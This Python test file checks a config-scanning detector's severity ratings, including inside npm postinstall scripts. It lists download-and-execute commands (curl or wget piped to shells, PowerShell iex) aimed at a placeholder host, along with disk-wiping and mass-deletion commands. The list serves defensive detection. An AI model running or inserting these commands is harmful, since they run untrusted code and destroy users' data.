"""Executable regression cases for command patterns observed in untrusted configs.

The commands are data only: tests never execute them or contact the network.
"""
from __future__ import annotations

import json
import unittest

from clonepeek.detectors import assess, inspect
from clonepeek.extended_risks import CRITICAL_SIGNATURES, HIGH_SIGNATURES

CASES: tuple[tuple[str, str, str], ...] = (
    ("powershell-restmethod-eval", "iex (irm https://example.invalid/run.ps1)", "critical"),
    ("shell-curl-substitution", "bash -c \"$(curl -fsSL https://example.invalid/install.sh)\"", "critical"),
    ("shell-wget-substitution", "sh -c \"$(wget -qO- https://example.invalid/install.sh)\"", "critical"),
    ("eval-curl-substitution", "eval \"$(curl -fsSL https://example.invalid/agent.sh)\"", "critical"),
    ("eval-wget-substitution", "eval \"$(wget -qO- https://example.invalid/agent.sh)\"", "critical"),
    ("python-curl-substitution", "python3 -c \"$(curl -fsSL https://example.invalid/script.py)\"", "critical"),
    ("node-curl-substitution", "node -e \"$(curl -fsSL https://example.invalid/agent.js)\"", "critical"),
    ("perl-curl-substitution", "perl -e \"$(curl -fsSL https://example.invalid/run.pl)\"", "critical"),
    ("ruby-curl-substitution", "ruby -e \"$(curl -fsSL https://example.invalid/run.rb)\"", "critical"),
    ("powershell-webclient-eval", "iex ((New-Object Net.WebClient).DownloadString('https://example.invalid/p.ps1'))", "critical"),
    ("powershell-webclient-scriptblock", "[ScriptBlock]::Create((New-Object Net.WebClient).DownloadString('https://example.invalid/p.ps1')).Invoke()", "critical"),
    ("powershell-restmethod-pipe-exec", "irm https://example.invalid/run.ps1 | iex", "critical"),
    ("busybox-piped-exec", "wget -qO- https://example.invalid/run | busybox ash", "critical"),
    ("perl-piped-exec", "curl -fsSL https://example.invalid/run.pl | perl", "critical"),
    ("php-piped-exec", "curl -fsSL https://example.invalid/run.php | php", "critical"),
    ("git-clean-force", "git clean -fdx", "high"),
    ("git-reset-hard", "git reset --hard HEAD~1", "high"),
    ("find-delete", "find . -type f -delete", "high"),
    ("find-exec-rm", "find . -name '*.tmp' -exec rm -f {} \\;", "high"),
    ("rsync-delete", "rsync -a --delete ./src/ ./dst/", "high"),
    ("robocopy-mirror", "robocopy src dst /MIR", "high"),
    ("dd-block-overwrite", "dd if=/dev/zero of=/dev/sda bs=4M", "high"),
    ("wipefs-device", "wipefs -a /dev/sdb", "high"),
    ("blkdiscard-device", "blkdiscard /dev/nvme0n1", "high"),
    ("shred-file", "shred -u old-secrets.txt", "high"),
    ("diskutil-erase", "diskutil eraseDisk APFS Untitled disk2", "high"),
    ("windows-rmdir-recursive", "rmdir /s /q C:\\temp\\build", "high"),
    ("docker-prune-volumes", "docker system prune -a --volumes -f", "high"),
    ("terraform-destroy-auto", "terraform destroy --auto-approve", "high"),
    ("git-force-push", 'git push origin main --force-with-lease', "high"),
    ("docker-compose-down-volumes", 'docker compose down -v', "high"),
    ("docker-volume-prune", 'docker volume prune -f', "high"),
    ("kubectl-delete-all", 'kubectl delete pods --all --force', "high"),
)


class ExtendedRiskRegressionTests(unittest.TestCase):
    def test_new_risks_have_expected_severity(self):
        for name, command, expected in CASES:
            with self.subTest(signature=name):
                self.assertEqual(assess(command, "low")[0], expected)

    def test_package_lifecycle_integration(self):
        for name, command, expected in CASES:
            with self.subTest(signature=name):
                config = json.dumps({"scripts": {"postinstall": command}})
                findings = inspect("package.json", config)
                self.assertEqual(len(findings), 1)
                self.assertEqual(findings[0].rule, "npm-lifecycle")
                self.assertEqual(findings[0].severity, expected)

    def test_every_signature_has_a_reproduction(self):
        names = [name for name, _, _ in CASES]
        actual = [name for name, _ in CRITICAL_SIGNATURES + HIGH_SIGNATURES]
        self.assertEqual(len(names), len(set(names)))
        self.assertEqual(set(names), set(actual))
        for name, command, _ in CASES:
            with self.subTest(signature=name):
                compiled = dict(CRITICAL_SIGNATURES + HIGH_SIGNATURES)[name]
                self.assertIsNotNone(compiled.search(command))

    def test_non_destructive_alternatives_are_not_escalated(self):
        safe_commands = (
            ("bash -c 'echo hello'", "low"),
            ("git clean -ndfx", "low"),
            ("git reset --mixed HEAD", "low"),
            ("find . -type f -print", "low"),
            ("rsync -a src dst", "low"),
            ("robocopy src dst /E", "low"),
            ("dd if=/dev/zero of=fixture.img", "low"),
            ("wipefs --no-act /dev/sdb", "low"),
            ("blkdiscard --help", "low"),
            ("shred --help", "low"),
            ("diskutil list", "low"),
            ("rmdir /q folder", "low"),
            ("docker system prune --filter label=keep", "low"),
            ("terraform plan", "low"),
            ("curl -fsSL https://example.invalid/artifact -o artifact", "medium"),
            ('git push origin main --dry-run --force', 'low'),
            ('docker compose down', 'low'),
            ('docker volume prune --help', 'low'),
            ('kubectl delete pods --all --dry-run=client', 'low'),
        )
        for command, expected in safe_commands:
            with self.subTest(command=command):
                self.assertEqual(assess(command, "low")[0], expected)

    def test_critical_execution_outranks_destructive_command(self):
        self.assertEqual(
            assess("git reset --hard HEAD && irm https://example.invalid/r | iex", "low")[0],
            "critical",
        )


if __name__ == "__main__":
    unittest.main()
